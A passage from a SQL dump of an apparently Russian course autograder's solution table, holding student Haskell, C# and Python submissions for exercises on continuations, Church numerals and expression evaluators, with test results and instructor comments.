(4248, 113, '442421', '2012-11-27 21:15:16', 1, 'sum_cps [] f = f 0\r\nsum_cps (x:xs) f = sum_cps xs (f.(+x))', '<br/>Тесты успешно пройдены!'),
(4249, 120, '6774563', '2012-11-27 21:16:57', 1, '--module Main where\r\n\r\n\r\n\r\nimport Data.List\r\n\r\nimport Data.Maybe\r\n\r\nimport qualified Data.Set as Set\r\n\r\n\r\n\r\n-- Константы не использую, при желании могу добавить\r\n  --- ОК, не надо, в условии про них ничего не написано.\r\ndata Expr = V String | Causes Expr Expr\r\n\r\n\r\n\r\n-- Ничего умного с ходу не придумал, поэтому делаю "в лоб"\r\n  --- Наверное это не лучший способ при большом количестве переменных, но ОК,\r\n  --- вполне нормально. \r\n\r\n\r\nisTautology e = let\r\n\r\n	vars = variables e\r\n\r\n	len = length vars\r\n\r\n		in all (id) (map (c -> eval e (zip vars c)) (combinations len))\r\n\r\n\r\n\r\ncombinations 0 = [[]]\r\n\r\ncombinations n = combinations (n-1) >>= xs -> [True:xs, False:xs]\r\n\r\n\r\n\r\nvariables e = Set.toList $ variables'' e\r\n\r\n\r\n\r\nvariables'' (V s) = Set.singleton s\r\n\r\nvariables'' (Causes e1 e2) = (variables'' e1) `Set.union` (variables'' e2)\r\n\r\n\r\n\r\neval (V s) values = snd $ fromJust $ find (x -> fst x == s) values\r\n\r\neval (Causes e1 e2) values = not (eval e1 values) || eval e2 values\r\n\r\n\r\n\r\n--main = putStrLn $ show $ isTautology $ Causes (V "A") (V "A")\r\n\r\n--main = putStrLn $ show $ isTautology $ Causes (Causes (V "A") (V "B")) (Causes (V "B") (V "A"))\r\n\r\n--main = putStrLn $ show $ isTautology $ Causes (Causes (Causes (V "A") (V "B")) (Causes (V "B") (V "C"))) (Causes (V "A") (V "C"))\r\n\r\n-- Здесь действительно False с такой ассоциативностью, я даже и не подумал бы, \r\n\r\n-- думал, что неправильно работает (на варианте True False False)\r\n\r\n\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(4250, 114, '4837959', '2012-11-27 21:28:48', 1, 'triangle1 n = [1..n] >>= x -> [1..x] >>= y -> return y\r\n\r\n\r\n\r\ntriangle2 n = do x <- [1..n]\r\n\r\n                 y <- [1..x]\r\n\r\n                 return y\r\n\r\n\r\n\r\ntest1 = triangle1 4\r\n\r\ntest2 = triangle2 4\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!');
INSERT INTO `solution` (`SolutionID`, `TaskID`, `UserID`, `LoadTimestamp`, `ResultID`, `Code`, `TestResult`) VALUES
(4251, 114, '419046', '2012-11-27 21:41:50', 1, 'triangle1 x = [1..x] >>= 	 -> [1..t] >>= y -> return y\r\n\r\n--triangle2 x = [y | t<-[1..x],y<-[1..t]]\r\n\r\ntriangle2 x = \r\n\r\n             do\r\n\r\n             t <- [1..x]\r\n\r\n             y <- [1..t]\r\n\r\n             return y\r\n', '<br/>Тесты успешно пройдены!'),
(4252, 112, '4837959', '2012-11-27 21:47:05', 1, 'data Expr = Let String Integer Expr | Var String | N Integer | Add Expr Expr | Mult Expr Expr deriving Show\r\n\r\n\r\n\r\neval (Let x n e) vars = eval e ((x, n):vars)\r\n\r\neval (Var x) vars = snd $ head $ filter ((var, val) -> var == x) vars\r\n\r\neval (N n) vars = n\r\n\r\neval (Add e1 e2) vars = eval e1 vars + eval e2 vars\r\n\r\neval (Mult e1 e2) vars = eval e1 vars * eval e2 vars\r\n\r\n\r\n\r\ntest = eval (Add (Let "x" 10 (Mult (Var "x") (Var "y"))) (N 1)) [("y", 2)]\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(4253, 118, 'tonyo', '2012-11-27 21:47:25', 0, '(>>>) f g  = g . snd . f  ', 'Не удалось вычислить выражение "let f = find (>3) >>> find (>3) in f [1, 3, 5, 2, 20, 25, 2]", проверьте правильность синтаксиса'),
(4254, 118, 'tonyo', '2012-11-27 21:48:20', 1, 'find cond (x:xs) = if cond x then (x, xs) else find cond xs  \r\n\r\n(>>>) f g  = g . snd . f  ', '<br/>Тесты успешно пройдены!'),
(4255, 112, '419046', '2012-11-27 21:59:18', 1, 'data Expr = Let String Integer Expr | Var String | N Integer | Add Expr Expr | Mult Expr Expr deriving Show\r\n\r\neval (Var v) (x:xs) = if (v==fst(x)) then snd(x) else (eval (Var v) xs)\r\n\r\neval (Let v i e) xs = eval e ((v,i):xs) \r\n\r\neval (N i) xs = i\r\n\r\neval (Add e1 e2) xs = (eval e1 xs) + (eval e2 xs)\r\n\r\neval (Mult e1 e2) xs = (eval e1 xs) * (eval e2 xs) \r\n\r\n \r\n', '<br/>Тесты успешно пройдены!'),
(4256, 116, '4837959', '2012-11-27 22:18:20', 2, '--- Вы случайно выложили пустое решение? \r\n--- Если вы раньше выкладывали правильное решение, выложите его снова, пожалуйста\r\n--- иначе оно будет не засчитано.', 'Не удалось вычислить выражение "let c3 f x = f (f (f x)) in toInt c3", проверьте правильность синтаксиса'),
(4257, 117, '4837959', '2012-11-27 22:34:34', 1, 'toInt churchNum = churchNum (	 -> t + 1) 0\r\n\r\ninc churchNum = f x -> f (churchNum f x)\r\n\r\n\r\n\r\ntest = toInt (inc (f x -> f (f (f x))))\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(4258, 115, '419046', '2012-11-27 22:47:34', 1, 'find cond [] = []\r\n\r\nfind cond (x:xs) = if cond x then [x] else find cond xs\r\n\r\nf xs = if (((find (<5) xs) /=[])&&((find (>10) xs) /=[])&&((find (/=7) xs) /=[])) \r\n\r\n       then [sum((find (<5) xs)++(find (>10) xs)++(find (/=7) xs))]\r\n\r\n       else []\r\n', '<br/>Тесты успешно пройдены!'),
(4259, 115, '44060', '2012-11-28 04:05:31', 2, '  --- Но это де не по условию, ву возвращаете или сумму или 0. \r\n  --- А надо вернуть или сумму в квадратных скобках или []\r\n  --- Попробуйте сделать так, пожалуйста. Ждя этого надо ваше решение исправить совсем немного.\r\n  --- Если не получится, просто выложите это же решение, и я его зачту.\r\nf xs = sum (do i<-find (<5) xs; j<-find (>10) xs; k<-find (/=7) xs; [i,j,k])\r\n		where\r\n			find cond [] = []\r\n			find cond (x:xs) = if cond x then [x] else find cond xs', 'Выражение имеет неправильное значение: f [7, 6, 4, 3, 20, 15, 9] '),
(4260, 114, '3431532', '2012-11-28 06:26:49', 0, 'triangle1 x = concat (take x triangleF)\r\ntriangle2 x = concat (take x triangleS)\r\n\r\n\r\ntriangleF =  [1] : (triangleF >>= x -> return (x ++ [(last x) + 1]))\r\n\r\ntriangleS = [1] : do { x<-triangleS;\r\n		 	  [x++[(last x) + 1]]}', '<br/>Тесты успешно пройдены!'),
(4261, 112, 'Deutsche', '2012-11-28 07:14:28', 1, 'This problem was sent by email, accept it please', 'Не удалось вычислить выражение "eval (Let [''x''] 10 (Mult (Var [''x'']) (Var [''y'']))) [([''y''], 2)]", проверьте правильность синтаксиса'),
(4262, 121, '3431532', '2012-11-28 07:29:38', 1, 'using System;\r\n\r\nnamespace sdfsdf\r\n{\r\n	class MainClass\r\n	{\r\n		public static void Main (string[] args)\r\n		{\r\n			Fac(10, f => Console.Write(f));\r\n		}\r\n\r\n		static void Fac(long n, Action<long> k)\r\n		{\r\n			if(n==0)\r\n				k(1);\r\n			else\r\n				Fac(n-1, f => k (f*n));\r\n		}\r\n	}\r\n}\r\n', '<br/>Тесты успешно пройдены!'),
(4263, 115, '4837959', '2012-11-28 07:32:44', 1, '-- Не придумал коротко :(\r\n  --- ОЕ, не вы один. Причемм решение очень простое - действительно надо соединить\r\n  --- find (<5) xs и  find (>10) xs и find (/=7) xs но только не с помощью ++,\r\n  --- а с помощью другого средства, которое вы тоже прекрасно знаете.. Ну, мы это разберем.\r\n\r\nfind cond [] = []\r\n\r\nfind cond (x:xs) = if cond x then [x]\r\n\r\n                   else find cond xs\r\n\r\n\r\n\r\nf xs = let\r\n\r\n           results = find (<5) xs ++ find (>10) xs ++ find (/=7) xs\r\n\r\n       in if (length results == 3) then [sum results]\r\n\r\n          else []\r\n\r\n\r\n\r\ntest1 = f [7, 6, 4, 3, 20, 15, 9] \r\n\r\ntest2 = f [7, 6, 4, 3, 9]\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(4264, 118, '4837959', '2012-11-28 07:51:08', 1, 'find cond (x:xs) = if cond x then (x, xs)\r\n\r\n                   else find cond xs\r\n\r\n\r\n\r\nf >>> g = g.snd.f\r\n\r\n\r\n\r\nf = find (>3) >>> find (>3)\r\n\r\ntest = f [1, 3, 5, 2, 20, 25, 2]\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(4265, 110, '3431532', '2012-11-28 07:51:51', 1, 'using System;\r\nusing System.Collections.Generic;\r\n\r\nnamespace sdfsdf\r\n{\r\n	class MainClass\r\n	{\r\n		public static void Main (string[] args)\r\n		{\r\n			List<int> list = new List<int>();\r\n			list.AddRange(new int[]{120,20,30,40,50});\r\n\r\n			Console.Write(find(x => x < 10, list, () => { return find(x => x < 20, list, () => 20 );}));\r\n		}\r\n\r\n		public static int find(Predicate<int> func, List<int> a, Func<int> err) \r\n		{\r\n			int index = a.FindIndex(func);\r\n			if(index==-1)\r\n				return err();\r\n			else\r\n				return a[index];\r\n		}\r\n	}\r\n}\r\n', '<br/>Тесты успешно пройдены!'),
(4266, 121, '4837959', '2012-11-28 07:58:36', 1, '#!/usr/bin/env python\r\n\r\n\r\n\r\ndef fact_cps(n, f):\r\n\r\n    if n == 0:\r\n\r\n        return f(1)\r\n\r\n    return fact_cps(n - 1, lambda t: f(t * n))\r\n\r\n\r\n\r\nprint fact_cps(4, lambda x: x)\r\n\r\nprint fact_cps(4, lambda x: x * x)\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(4267, 107, '318210', '2012-11-28 08:44:46', 1, 'data LogExpr = X | T | F | Or LogExpr LogExpr | And LogExpr LogExpr | Not LogExpr \r\n\r\nexpr X ex = ex\r\nexpr T _ = True\r\nexpr F _ = False\r\n\r\nexpr (Or ex1 ex2) ex3 = expr ex1 ex3 || expr ex2 ex3\r\nexpr (And ex1 ex2) ex3 = expr ex1 ex3 && expr ex2 ex3\r\nexpr (Not ex1) ex2 = not (expr ex1 ex2)\r\n\r\ninstance Eq LogExpr where\r\n	x == y = expr x True == expr y True && expr x False == expr y False\r\n', '<br/>Тесты успешно пройдены!'),
(4268, 109, '3431532', '2012-11-28 09:00:56', 1, 'using System;\r\nusing System.Collections.Generic;\r\n\r\nnamespace sdfsdf\r\n{\r\n	class MainClass\r\n	{\r\n		public static void Main (string[] args)\r\n		{\r\n			List<int> list = new List<int>();\r\n			list.AddRange(new int[]{120,20,30,40,50});\r\n\r\n			AllDiffLists(3,2);\r\n		}\r\n\r\n		public static void AllDiffLists (int n, int k)\r\n		{\r\n			AllList(n, k, x => true, () => Console.WriteLine(""));\r\n		}\r\n\r\n		public static void AllList (int n, int k, Func<int, bool> mem, Action print)\r\n		{\r\n			if (k == 0)\r\n				print ();\r\n			else {\r\n				for(int i=1;i<=n;i++)\r\n					if(mem(i))\r\n					{\r\n						AllList(n, k-1, x => mem(x) && x != i, () => {  print(); Console.Write(String.Format(" {0}", i)); });\r\n					}\r\n\r\n			}\r\n\r\n\r\n		}\r\n	}\r\n}\r\n', '<br/>Тесты успешно пройдены!'),
(4269, 118, '318210', '2012-11-28 09:33:32', 1, 'find cond (x:xs) = if cond x then (x, xs) else find cond xs\r\n\r\n(>>>) f1 f2 l = let (val, rez) = f1 l \r\n		    in f2 rez\r\n\r\nf = find (>3) >>> find (>3)', '<br/>Тесты успешно пройдены!'),
(4270, 114, '3431532', '2012-11-28 09:55:26', 1, 'triangle1 x = ([1..x] >>= x -> [1..x])\r\n\r\ntriangle2 x = do { t <- [1..x];\r\n		 	  	   [1..t]}\r\n-- что-то я и правда переборщил =)', '<br/>Тесты успешно пройдены!'),
(4271, 113, '3607492', '2012-11-28 09:59:26', 1, 'add_cps x y k = k (x+y)\r\n\r\nsum_cps [] f = f 0\r\nsum_cps (x:xs) f = sum_cps (xs) (	 ->add_cps t x f)', '<br/>Тесты успешно пройдены!'),
(4272, 106, '3607492', '2012-11-28 10:21:39', 0, 'check [] count cur = case count of\r\n					 0->Nothing\r\n					 _->Just cur\r\ncheck (x:xs) count cur = if (cur==x)\r\n							then check xs (count+1) cur\r\n							else if (count==0) then check xs count x\r\n								 else check xs (count-1) cur\r\n\r\n\r\nfindMajor x = check x 0 0', '<br/>Тесты успешно пройдены!'),
(4273, 106, '3607492', '2012-11-28 10:22:08', 2, '--вроде за 1 проход по списку..\r\n  --- Идея вообще правильная, но вот пример, кторый показывает, что одного прохода все же недостаточно\r\n  ---   findMajor [1,2,1,2,3,3,3]\r\n  --- у вас получается Just 3, f надо Nothing\r\n  --- Допишите, пожалуйста, это просто\r\ncheck [] count cur = case count of\r\n					 0->Nothing\r\n					 _->Just cur\r\ncheck (x:xs) count cur = if (cur==x)\r\n							then check xs (count+1) cur\r\n							else if (count==0) then check xs count x\r\n								 else check xs (count-1) cur\r\n\r\n\r\nfindMajor x = check x 0 0', '<br/>Тесты успешно пройдены!'),
(4274, 109, '318210', '2012-11-28 10:26:12', 1, 'using System;\r\nusing System.Collections.Generic;\r\nusing System.Linq;\r\nusing System.Text;\r\n\r\nnamespace _291\r\n{\r\n    class Program\r\n    {\r\n        public static void aDL(int n, int k, Predicate<int> cond, Action toPrint) \r\n        {\r\n            if (k == 0)\r\n            {\r\n                toPrint();\r\n                Console.WriteLine();\r\n            }\r\n            else\r\n            {\r\n                for (int i = 1; i <= n; ++i)\r\n                {\r\n                    if (!cond.Invoke(i))\r\n                    {\r\n                        aDL(n, k - 1, x => cond.Invoke(x) || x == i, () => { toPrint(); Console.Write(i.ToString() + " "); }); \r\n                    }\r\n                }\r\n            }            \r\n        }\r\n        public static void allDiffLists(int n, int k)\r\n        {\r\n            aDL(n, k, x => false, () => { });\r\n        }\r\n        static void Main(string[] args)\r\n        {\r\n            allDiffLists(3, 2);\r\n            Console.ReadKey();\r\n        }\r\n    }\r\n}\r\n', '<br/>Тесты успешно пройдены!'),
(4275, 121, '318210', '2012-11-28 10:55:09', 1, 'using System;\r\nusing System.Collections.Generic;\r\nusing System.Linq;\r\nusing System.Text;\r\n\r\nnamespace _321\r\n{\r\n    class Program\r\n    {\r\n        public static int fact_cps(int n, Func<int,int> f)\r\n        {\r\n            if (n == 0)\r\n            {\r\n                return f(1);\r\n            }\r\n            else\r\n            {\r\n                return fact_cps(n - 1, t => f(t * n));\r\n            }\r\n        }\r\n        static void Main(string[] args)\r\n        {\r\n            int n;\r\n            string s = Console.ReadLine();\r\n            n = Int16.Parse(s);\r\n            int d = fact_cps(n, x => x);\r\n            Console.WriteLine(d);\r\n            Console.ReadKey();\r\n        }\r\n    }\r\n}\r\n', '<br/>Тесты успешно пройдены!'),
(4276, 106, '3431532', '2012-11-28 11:01:52', 1, 'findMajor x = check (findMajorH x Nothing 0) x\r\n\r\nfindMajorH (x:xs) Nothing count = findMajorH xs (Just x) 1\r\nfindMajorH (x:xs) (Just b) count | x == b = findMajorH xs (Just b) (count+1)\r\nfindMajorH (x:xs) (Just b) 1 | x /= b  = findMajorH xs Nothing 0\r\nfindMajorH (x:xs) (Just b) count | x /= b  = findMajorH xs (Just b) (count-1)\r\nfindMajorH [] x _ = x\r\n\r\ncheck (Just x) xs | ((length xs) `div` 2) < (occur x xs) = Just x \r\ncheck  _ _ = Nothing\r\n\r\noccur x (a:as)|x==a = 1 + (occur x as)\r\noccur x (a:as) = occur x as\r\noccur x [] = 0', '<br/>Тесты успешно пройдены!'),
(4277, 110, '3607492', '2012-11-28 11:13:42', 1, 'using System;\r\n\r\nnamespace prj1\r\n{\r\n	class MainClass\r\n	{\r\n		public static int find (Func<int,bool> f, int[] arr, Func<int> f1)\r\n		{\r\n			foreach (int a in arr) \r\n			{\r\n				if (f(a))\r\n					return a;\r\n			}\r\n			return f1();\r\n		}\r\n		public static void Main (string[] args)\r\n		{\r\n			int[] arr = {21,22,23,24,25,26,27,28,29,12};\r\n			int res = find(x => x < 10, arr, () => {return find(x => x < 20, arr, () => {return 20;});});   \r\n			Console.WriteLine("{0}",res); \r\n			Console.Read();\r\n		}\r\n	}\r\n}', '<br/>Тесты успешно пройдены!'),
(4278, 108, '318210', '2012-11-28 12:57:38', 1, 'queens n k = map (fst) (f n k) where \r\nf n 0 = [([], \\_ _ -> False)]\r\nf n k = [((k, i):l,xCoord1 xCoord2 -> xCoord2 == i || check xCoord1 xCoord2 || abs (xCoord1 - k) == abs (xCoord2 - i)) \r\n				| (l, check) <- f n (k - 1), i <- [1..n], not (check k i)]', '<br/>Тесты успешно пройдены!'),
(4279, 106, '3607492', '2012-11-28 13:30:15', 2, '--так? :)\r\n  --- Вообще идея правильная, замечательно, но немного не доведенна ядо конца.\r\n  --- Вот так findMajor [3,3,1,2,1,2,1,3,3] у вас получается Just 3 а дб Nothing\r\n  --- Попробуйте исправить, пожалуйста (а я добавлю такой тест)\r\ncheck [] count cur = case count of\r\n					 0->Nothing\r\n					 _->Just cur\r\ncheck (x:xs) count cur = if (cur==x)\r\n							then check xs (count+1) cur\r\n							else if (count==0) then check xs count x\r\n								 else check xs (count-1) cur\r\n\r\n\r\nfindMajor x = if (a==b) then a else Nothing\r\n			where\r\n				a = check x 0 0 \r\n				b = check (reverse x) 0 0', '<br/>Тесты успешно пройдены!'),
(4280, 110, '5772638', '2012-11-28 13:34:54', 1, '﻿using System;\r\n\r\nusing System.Collections.Generic;\r\n\r\nusing System.Linq;\r\n\r\nusing System.Text;\r\n\r\n\r\n\r\nnamespace simuni\r\n\r\n{\r\n\r\n    class Program\r\n\r\n    {\r\n\r\n        public static int find(Predicate<int> func, int[] a, Func<int> err) \r\n\r\n        {\r\n\r\n            bool fl = false;\r\n\r\n            int i = 0; int res=0;\r\n\r\n            while (i< a.Length) \r\n\r\n            {\r\n\r\n                if (func(a[i])) \r\n\r\n                { res = a[i];\r\n\r\n                fl = true;\r\n\r\n                }\r\n\r\n                                   \r\n\r\n                i++;\r\n\r\n            }\r\n\r\n            if (!fl) res = err();\r\n\r\n            \r\n\r\n            return res;\r\n\r\n   \r\n\r\n        }\r\n\r\n        static void Main(string[] args)\r\n\r\n        {\r\n\r\n            int[] arr = new int[3];\r\n\r\n            arr[0] = 100;\r\n\r\n            arr[1] = 30;\r\n\r\n            arr[2] = 11;\r\n\r\n            var res = find(x => x <10, arr, () => { return find(x => x <20, arr, () =>20); });\r\n\r\n            System.Console.WriteLine(res);\r\n\r\n            System.Console.ReadKey();\r\n\r\n        }\r\n\r\n    }\r\n\r\n}\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(4281, 114, '51559263', '2012-11-28 13:57:25', 0, 'triangle1 n = [1..n] >>=  m -> [1..m]\r\n\n\r\n\ntriangle2 n = do \r\n\n                 i <- [1..n]\r\n\n	         j <- [1..i]\r\n\n		 return j\n', '<br/>Тесты успешно пройдены!'),
(4282, 114, '51559263', '2012-11-28 13:57:28', 1, 'triangle1 n = [1..n] >>=  m -> [1..m]\r\n\r\n\r\n\r\ntriangle2 n = do \r\n\r\n                 i <- [1..n]\r\n\r\n	         j <- [1..i]\r\n\r\n		 return j\r\n', '<br/>Тесты успешно пройдены!'),
(4283, 116, '419046', '2012-11-28 14:10:28', 1, ' \r\n\r\n toInt church = church (+1) 0\r\n', '<br/>Тесты успешно пройдены!'),
(4284, 110, '3742311', '2012-11-28 14:26:56', 1, 'using System;\r\nusing System.Collections.Generic;\r\nusing System.Linq;\r\n\r\nnamespace Task291\r\n{\r\n    public static class Program\r\n    {\r\n        public static int Find(IEnumerable<int> elements, Func<int, bool> cond, int err)\r\n        {\r\n            int result;\r\n\r\n            try\r\n            {\r\n                result = elements.First(cond);\r\n            }\r\n            catch (InvalidOperationException)\r\n            {\r\n                result = err;\r\n            }\r\n\r\n            return result;\r\n        }\r\n\r\n        public static int FindExample(IEnumerable<int> elements)\r\n        {\r\n            return Find(elements, x => x < 10, Find(elements, x => x < 20, 20));\r\n        }\r\n\r\n        public static void Main(string[] args)\r\n        {\r\n            int[] elements = { 15, 23, 32 };\r\n            Console.WriteLine(FindExample(elements));\r\n\r\n            Console.ReadLine();\r\n        }\r\n    }\r\n}\r\n', '<br/>Тесты успешно пройдены!'),
(4285, 106, '3607492', '2012-11-28 14:43:44', 1, 'check [] count cur = case count of\r\n					 0->Nothing\r\n					 _->Just cur\r\ncheck (x:xs) count cur = if (cur==x)\r\n							then check xs (count+1) cur\r\n							else if (count==0) then check xs 1 x\r\n								 else check xs (count-1) cur\r\n\r\ncheck2 [] count cur = count\r\ncheck2 (x:xs) count cur = if (cur==x) then check2 xs (count+1) cur\r\n									  else check2 xs (count-1) cur\r\n\r\nfindMajor x = case check x 0 0 of\r\n			  Nothing -> Nothing\r\n			  Just z -> if (t > 0) then Just z else Nothing where t = check2 x 0 z', '<br/>Тесты успешно пройдены!'),
(4286, 111, 'erwert', '2012-11-28 14:57:56', 1, 'data Expr = Var String | N Integer | Add Expr Expr | Mult Expr Expr deriving(Show, Eq)\r\neval (Var s) l = snd $ head $ filter ((a,b) -> a == s) l\r\neval (N a) l = a\r\neval (Mult a b) l = eval a l * eval b l\r\neval (Add a b) l = eval a l + eval b l', '<br/>Тесты успешно пройдены!'),
(4287, 112, 'erwert', '2012-11-28 15:22:15', 1, 'data Expr =  Let String Integer Expr | Var String | N Integer | Add Expr Expr | Mult Expr Expr deriving(Show, Eq)\r\neval (Let s a e) l = eval e ((s, a):l)\r\neval (Var s) l = snd $ head $ filter ((a,b) -> a == s) l\r\neval (N a) l = a\r\neval (Mult a b) l = eval a l * eval b l\r\neval (Add a b) l = eval a l + eval b l', '<br/>Тесты успешно пройдены!'),
(4288, 111, '51559263', '2012-11-28 15:43:35', 1, 'data Expr = N Integer | Var String | Add Expr Expr | Mult Expr Expr deriving Show\r\n\r\n\r\n\r\neval (N n) _ = n\r\n\r\n\r\n\r\neval (Var var) ( (v,n) : vars ) = if v == var\r\n\r\n                                  then n\r\n\r\n                                  else eval (Var var) vars\r\n\r\n								  \r\n\r\neval ( Add e1 e2 ) vars = ( eval e1 vars ) + ( eval e2 vars )\r\n\r\n\r\n\r\neval ( Mult e1 e2 ) vars = ( eval e1 vars ) * ( eval e2 vars )\r\n', '<br/>Тесты успешно пройдены!'),
(4289, 112, '51559263', '2012-11-28 15:53:19', 1, 'data Expr = N Integer | Var String | Add Expr Expr | Mult Expr Expr | Let String Integer Expr deriving Show\r\n\r\n\r\n\r\neval (N n) _ = n\r\n\r\n\r\n\r\neval (Var var) ( (v,n) : vars ) = if v == var\r\n\r\n                                  then n\r\n\r\n                                  else eval (Var var) vars\r\n\r\n								  \r\n\r\neval ( Let var val e ) vars = eval e ( (var,val) : vars )\r\n\r\n								  \r\n\r\neval ( Add e1 e2 ) vars = ( eval e1 vars ) + ( eval e2 vars )\r\n\r\n\r\n\r\neval ( Mult e1 e2 ) vars = ( eval e1 vars ) * ( eval e2 vars )\r\n', '<br/>Тесты успешно пройдены!'),
(4290, 113, '51559263', '2012-11-28 16:01:17', 1, 'sum_cps [] f = f 0\r\n\r\nsum_cps (x:xs) f = sum_cps xs (f.(+x))\r\n', '<br/>Тесты успешно пройдены!'),
(4291, 111, 'hasp', '2012-11-28 16:07:08', 1, 'import Data.Map\r\nimport Prelude hiding (lookup)\r\n\r\n\r\ndata Expr = N Int | Var String | Add Expr Expr | Mult Expr Expr | Let String Int Expr \r\n\r\nevalWithCtx (N i) _ = i\r\nevalWithCtx (Var name) env = case lookup name env of {Just a -> a} \r\nevalWithCtx (Add l r) env = let lv = evalWithCtx l env; rv = evalWithCtx r env in lv + rv\r\nevalWithCtx (Mult l r) env = let lv = evalWithCtx l env; rv = evalWithCtx r env in lv * rv\r\nevalWithCtx (Let name val expr) env = evalWithCtx expr (insert name val env)\r\n\r\neval expr lst = evalWithCtx expr (fromList lst)', '<br/>Тесты успешно пройдены!'),
(4292, 112, 'hasp', '2012-11-28 16:07:21', 1, 'import Data.Map\r\nimport Prelude hiding (lookup)\r\n\r\n\r\ndata Expr = N Int | Var String | Add Expr Expr | Mult Expr Expr | Let String Int Expr \r\n\r\nevalWithCtx (N i) _ = i\r\nevalWithCtx (Var name) env = case lookup name env of {Just a -> a} \r\nevalWithCtx (Add l r) env = let lv = evalWithCtx l env; rv = evalWithCtx r env in lv + rv\r\nevalWithCtx (Mult l r) env = let lv = evalWithCtx l env; rv = evalWithCtx r env in lv * rv\r\nevalWithCtx (Let name val expr) env = evalWithCtx expr (insert name val env)\r\n\r\neval expr lst = evalWithCtx expr (fromList lst)', '<br/>Тесты успешно пройдены!'),
(4293, 113, 'hasp', '2012-11-28 16:07:43', 1, 'sum_cps (x:[]) f = f x\r\nsum_cps (x:xs) f = sum_cps xs (	 -> f (t + x))', '<br/>Тесты успешно пройдены!'),
(4294, 114, 'hasp', '2012-11-28 16:08:05', 1, 'triangle1 n = [1..n] >>= 	 -> [1..t] >>= k -> return k\r\ntriangle2 n = do \r\n				t <- [1..n] \r\n				k <- [1..t]\r\n				return k', '<br/>Тесты успешно пройдены!'),
(4295, 116, 'hasp', '2012-11-28 16:08:38', 1, 'toInt f = f (+1) 0		', '<br/>Тесты успешно пройдены!'),
(4296, 117, 'hasp', '2012-11-28 16:08:54', 0, 'inc f = k t -> k (f k t)', 'Не удалось вычислить выражение "let c3 f x = f (f x) in toInt (inc c3)", проверьте правильность синтаксиса'),
(4297, 117, 'hasp', '2012-11-28 16:11:20', 1, 'toInt f = f (+1) 0				\r\ninc f = k t -> k (f k t)\r\n--и что ему не нравится...\r\n  --- Так а почему вы думаете, что ему что-то не нравится?\r\na = let c3 f x = f (f x) in toInt (inc c3)', '<br/>Тесты успешно пройдены!'),
(4298, 113, '82873297', '2012-11-28 16:26:16', 1, 'sum_cps [x] f = f x\r\n\r\nsum_cps (x:xs) f = sum_cps xs (	->f (t+x))\r\n', '<br/>Тесты успешно пройдены!'),
(4299, 118, '51559263', '2012-11-28 16:29:51', 1, 'find cond (x:xs) = if cond x then (x, xs) else find cond xs\r\n\r\n\r\n\r\nfstfind >>> sndfind = sndfind.snd.fstfind\r\n\r\n\r\n\r\nf = find (>3) >>> find (>3)\r\n', '<br/>Тесты успешно пройдены!'),
(4300, 116, '82873297', '2012-11-28 17:07:58', 1, 'toInt f = f (x->x+1) 0 \r\n', '<br/>Тесты успешно пройдены!'),
(4301, 117, '82873297', '2012-11-28 17:08:18', 1, 'toInt f = f (x->x+1) 0 \r\n\r\n\r\n\r\ninc g = f x -> f (g f x) \r\n', '<br/>Тесты успешно пройдены!'),
(4302, 111, '4169333', '2012-11-28 17:27:11', 1, 'data Expr= Var String | N Integer |Add Expr Expr| Mult Expr Expr deriving Show\r\neval (N n) xs=n\r\neval (Add a b) xs= (eval a xs) + (eval b xs)\r\neval (Mult a b) xs = (eval a xs) * (eval b xs)\r\neval (Var s) []= -1\r\neval (Var s) (x:xs) = if (fst x== s)\r\n	 	      then snd x\r\n                      else eval (Var s) (xs)', '<br/>Тесты успешно пройдены!'),
(4303, 112, '4169333', '2012-11-28 17:27:39', 1, 'data Expr= Var String | Let String Integer Expr |N Integer |Add Expr Expr| Mult Expr Expr deriving Show\r\neval (N n) xs=n\r\neval (Add a b) xs= (eval a xs) + (eval b xs)\r\neval (Mult a b) xs = (eval a xs) * (eval b xs)\r\neval (Var s) []= -1\r\neval (Var s) (x:xs) = if (fst x== s)\r\n	 	      then snd x\r\n                      else eval (Var s) (xs)\r\neval (Let s n ys) xs = eval ys ((s,n):xs)', '<br/>Тесты успешно пройдены!'),
(4304, 113, '4169333', '2012-11-28 17:27:59', 1, 'sum_cps [] f=f 0\r\nsum_cps (x:xs) f=sum_cps (xs) (	->f(t+x))', '<br/>Тесты успешно пройдены!'),
(4305, 114, '4169333', '2012-11-28 17:30:15', 1, 'triangle1 n = return ( [1..n] >>= x-> [1..x]) \r\ntriangle2 n= do\r\n		x<-[1..n]\r\n                y<-[1..x]\r\n                return y\r\n', '<br/>Тесты успешно пройдены!'),
(4306, 115, '4169333', '2012-11-28 17:30:39', 1, 'f []= error "Empty List"\r\nf xs = if ( ((find (<5) xs) /= []) && ((find (>10) xs) /= []) && ((find (/=7) xs) /= []) )  then\r\n          ( [sum ( (find (<5) xs) ++ (find (>10) xs) ++ (find (/=7) xs))] )\r\n       else []\r\n\r\nfind cond [] = []\r\nfind cond (x:xs) = if cond x then [x] else find cond xs', '<br/>Тесты успешно пройдены!'),
(4307, 116, '4169333', '2012-11-28 17:32:40', 1, 'toInt f = f (x -> x+1) 0', '<br/>Тесты успешно пройдены!'),
(4308, 117, '4169333', '2012-11-28 17:34:15', 1, 'inc ff= f -> x -> f (ff f x)\r\n  \r\ntoInt ff = ff (x -> x+1) 0\r\n', '<br/>Тесты успешно пройдены!'),
(4309, 118, '4169333', '2012-11-28 17:34:36', 1, '(x >>> y) xs= let \r\n		 n1= x xs\r\n                 n2= y (snd(n1))\r\n               in (n2)\r\n                 \r\n\r\nfind cond (x:xs) = if cond x then (x, xs) else find cond xs\r\nf=find (>3) >>> find (>3)', '<br/>Тесты успешно пройдены!'),
(4310, 116, '51559263', '2012-11-28 17:55:19', 1, 'toInt f = f (+1) 0\r\n\r\n\r\n\r\ninc g f x = g f (f x)\r\n', '<br/>Тесты успешно пройдены!'),
(4311, 117, '51559263', '2012-11-28 17:55:34', 1, 'toInt f = f (+1) 0\r\n\r\n\r\n\r\ninc g f x = g f (f x)\r\n', '<br/>Тесты успешно пройдены!'),
